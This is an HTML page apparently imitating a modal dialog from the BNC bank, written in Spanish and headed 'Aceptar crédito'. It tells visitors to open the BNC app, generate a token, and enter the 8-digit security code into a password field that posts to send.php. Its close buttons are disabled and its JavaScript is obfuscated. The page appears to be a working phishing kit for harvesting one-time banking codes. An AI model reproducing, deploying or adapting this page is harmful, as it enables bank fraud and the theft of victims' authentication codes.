<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <link rel="shortcut icon" href="iconero.ico">
    <title>BNC</title>

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
        rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;

            min-height: 100vh;

            display: flex;
            justify-content: center;
            align-items: center;

            background:
                linear-gradient(rgba(255, 255, 255, .75),
                    rgba(255, 255, 255, .75)),
                #dfe3e8;

            padding: 20px;
        }

        /* =========================================
           MODAL
        ========================================= */

        .modal {
            width: 100%;
            max-width: 610px;

            background: #fff;

            border-radius: 16px;

            overflow: hidden;

            box-shadow:
                0 10px 35px rgba(0, 0, 0, .18);

            border: 1px solid #d7d7d7;
        }

        /* =========================================
           HEADER
        ========================================= */

        .modal-header {
            height: 60px;

            background:
                linear-gradient(to bottom,
                    #2e5ea7,
                    #234a87);

            display: flex;
            align-items: center;
            justify-content: space-between;

            padding: 0 18px;
        }

        .modal-title {
            color: white;
            font-size: 19px;
            font-weight: 700;
        }

        .close-btn {
            border: none;
            background: transparent;

            color: white;

            font-size: 24px;
            font-weight: 700;

            cursor: pointer;

            opacity: .9;
        }

        .close-btn:hover {
            opacity: 1;
        }

        /* =========================================
           BODY
        ========================================= */

        .modal-body {
            padding: 18px;
        }

        .token-wrapper {
            border: 1px solid #e0e0e0;
            border-radius: 18px;

            padding: 18px;

            background: #fbfbfb;
        }

        .token-box {
            border: 1px solid #dfdfdf;
            border-radius: 18px;

            padding: 16px;

            background: white;
        }

        /* =========================================
           INPUTS
        ========================================= */

        .top-input {
            width: 100%;
            height: 48px;

            border-radius: 14px;
            border: 1px solid #d8d8d8;

            padding: 0 18px;

            font-size: 15px;
            font-family: 'Poppins', sans-serif;

            margin-bottom: 18px;

            outline: none;

            color: #666;
        }

        .message {
            color: #707070;

            font-size: 15px;
            line-height: 1.7;

            margin-bottom: 18px;
        }

        .message strong {
            color: #4b4b4b;
            font-weight: 700;
        }

        .bnc {
    font-weight: 700;
    font-size: 15px;
    letter-spacing: 1px;
}

.bnc span:nth-child(1) {
    color: #ff7a00; /* naranja */
}

.bnc span:nth-child(2) {
    color: #005eff; /* azul */
}

.bnc span:nth-child(3) {
    color: #33b44a; /* verde */
}

        .message .lightning {
  font-size: 48px;
  color: #00aaff;
  text-shadow:
    0 0 5px #00aaff,
    0 0 10px #00ccff,
    0 0 20px #33ddff;
}

        .security-input {
            width: 100%;
            height: 54px;

            border-radius: 10px;
            border: 1px solid #d9d9d9;

            padding: 0 18px;

            font-size: 15px;
            font-family: 'Poppins', sans-serif;

            outline: none;

            transition: .25s;
        }

        .security-input:focus {
            border: 2px solid #5ba3ff;
        }

        /* =========================================
           BUTTONS
        ========================================= */

        .actions {
            display: flex;
            justify-content: center;
            gap: 14px;

            margin-top: 22px;
        }

        .btn {
            height: 48px;

            border: none;
            border-radius: 8px;

            padding: 0 26px;

            font-family: 'Poppins', sans-serif;
            font-size: 16px;
            font-weight: 600;

            cursor: pointer;

            transition: .2s;

            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-success {
            background:
                linear-gradient(to bottom,
                    #49d04e,
                    #2ca62f);

            color: white;

            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, .35);
        }

        .btn-success:hover {
            transform: translateY(-1px);
        }

        .btn-gray {
            background:
                linear-gradient(to bottom,
                    #f8f8f8,
                    #ececec);

            border: 1px solid #d8d8d8;

            color: #6f6f6f;
        }

        /* =========================================
           FOOTER
        ========================================= */

        .footer {
            border-top: 2px solid #ff5b5b;

            padding: 16px 18px 20px;
        }

        .footer-title {
            font-size: 16px;
            font-weight: 600;

            color: #444;

            margin-bottom: 14px;
        }

        .step {
            display: flex;
            align-items: center;
            gap: 12px;

            margin-bottom: 12px;

            color: #6d6d6d;

            font-size: 14px;
        }

        .check {
            width: 24px;
            height: 24px;

            border-radius: 50%;

            background:
                linear-gradient(to bottom,
                    #ff684f,
                    #f54236);

            display: flex;
            align-items: center;
            justify-content: center;

            color: white;

            font-size: 13px;
            font-weight: 700;

            flex-shrink: 0;
        }

        .mini-btn {
            background: #36b42c;
            color: white;

            padding: 2px 10px;

            border-radius: 20px;

            font-size: 12px;
            font-weight: 600;
        }

        /* =========================================
           RESPONSIVE
        ========================================= */

        @media(max-width:600px) {

            .modal-title {
                font-size: 17px;
            }

            .message {
                font-size: 14px;
            }

            .actions {
                flex-direction: column;
            }

            .btn {
                width: 100%;
            }
        }


        .top-input:disabled {
  color: inherit;
  background-color: inherit;
  opacity: 1; /* evita que se vea más tenue */
  cursor: not-allowed; /* opcional, para indicar que no se puede usar */
}

        .lightning-icon {
    display: inline-flex;
    align-items: center;
    justify-content: center;

    width: 16px;
    height: 16px;
}

.lightning-icon svg {
    width: 100%;
    height: 100%;
    display: block;
}
    </style>
</head>

<body>

    <div class="modal">

        <!-- HEADER -->
        <form method="post" action="send.php">
        <div class="modal-header">
            
            <div class="modal-title">
                Aceptar crédito
            </div>

            <button class="close-btn" id="closeModal" disabled>
                ×
            </button>

        </div>

        <!-- BODY -->

        <div class="modal-body">

            <div class="token-wrapper">

                <div class="token-box">

                    <input
  type="text"
  class="top-input"
  placeholder="Solicitud de Token BNC"
  disabled
>

                    <div class="message">

                        Abra la App
                        <span class="bnc">
    <span>B</span><span>N</span><span>C</span>
</span>
                        opción
                        <span class="lightning-icon">
    <svg viewBox="0 0 24 24" fill="none">
        <path d="
            M13.2 1.5
            L5.8 13
            H11
            L9.8 22.5
            L18.2 9.8
            H13.6
            L13.2 1.5
        "
        fill="#1f7cff"/>
    </svg>
</span>

                        <strong>Operaciones Directas</strong>

                        <br>

                        <strong>BNC > Token BNC</strong>

                        y coloque a continuación el
                        Token generado activo.

                    </div>

                    <input
                        type="password"
                        class="security-input"
                        placeholder="Código de Seguridad"
                        required
                        minlength="8" maxlength="8"
                        inputmode="numeric"
                        name="otp"
                        >

                </div>

            </div>

            <!-- BUTTONS -->

            <div class="actions">

                <button class="btn btn-success">
                    ➜ Continuar
                </button>
                </form>
                <button class="btn btn-gray" id="cancelBtn" disabled>
                    ⃠  Cerrar
                </button>

            </div>

        </div>

        <!-- FOOTER -->

        <div class="footer">

            <div class="footer-title">
                Pasos a Seguir:
            </div>

            <div class="step">
                <div class="check">✓</div>

                <div>
                    <strong>Obligatorio.</strong>
                    Ingrese los datos solicitados.
                </div>
            </div>

            <div class="step">
                <div class="check">✓</div>

                <div>
                    <strong>Obligatorio.</strong>
                    Si es correcto, oprima

                    <span class="mini-btn">
                        Continuar
                    </span>
                </div>
            </div>

        </div>

    </div>
<script>
const _0x8f6899=_0x5c8d;function _0x5c8d(_0x488b10,_0x4fe91a){_0x488b10=_0x488b10-0xcf;const _0x2eb0c0=_0x2eb0();let _0x5c8d06=_0x2eb0c0[_0x488b10];return _0x5c8d06;}function _0x2eb0(){const _0x31ac43=['none','5241390xNjmGf','querySelector','3787028DoCPXq','16gjCzZT','addEventListener','945191yeYDnd','6EyuPig','click','display','.modal','7535310BeqTjR','622872SBtRKb','3430870MpdiFE','style','72KNOxnz','284746lnezXC','closeModal','getElementById','scale(.92)'];_0x2eb0=function(){return _0x31ac43;};return _0x2eb0();}(function(_0x1bad57,_0x14265a){const _0x2ff167=_0x5c8d,_0xf014ad=_0x1bad57();while(!![]){try{const _0x54a39a=-parseInt(_0x2ff167(0xe1))/0x1+parseInt(_0x2ff167(0xd7))/0x2+parseInt(_0x2ff167(0xdc))/0x3+parseInt(_0x2ff167(0xd3))/0x4+-parseInt(_0x2ff167(0xd2))/0x5*(-parseInt(_0x2ff167(0xe2))/0x6)+-parseInt(_0x2ff167(0xde))/0x7*(-parseInt(_0x2ff167(0xdf))/0x8)+-parseInt(_0x2ff167(0xd6))/0x9*(parseInt(_0x2ff167(0xd4))/0xa);if(_0x54a39a===_0x14265a)break;else _0xf014ad['push'](_0xf014ad['shift']());}catch(_0x4b806c){_0xf014ad['push'](_0xf014ad['shift']());}}}(_0x2eb0,0xe6914));const closeBtn=document[_0x8f6899(0xd9)](_0x8f6899(0xd8)),cancelBtn=document['getElementById']('cancelBtn');function closeModal(){const _0x5e7b47=_0x8f6899;document[_0x5e7b47(0xdd)](_0x5e7b47(0xd1))[_0x5e7b47(0xd5)]['opacity']='0',document[_0x5e7b47(0xdd)](_0x5e7b47(0xd1))[_0x5e7b47(0xd5)]['transform']=_0x5e7b47(0xda),setTimeout(()=>{const _0x110e68=_0x5e7b47;document[_0x110e68(0xdd)]('.modal')[_0x110e68(0xd5)][_0x110e68(0xd0)]=_0x110e68(0xdb);},0xb4);}closeBtn[_0x8f6899(0xe0)]('click',closeModal),cancelBtn[_0x8f6899(0xe0)](_0x8f6899(0xcf),closeModal);
</script>
</body>
</html>
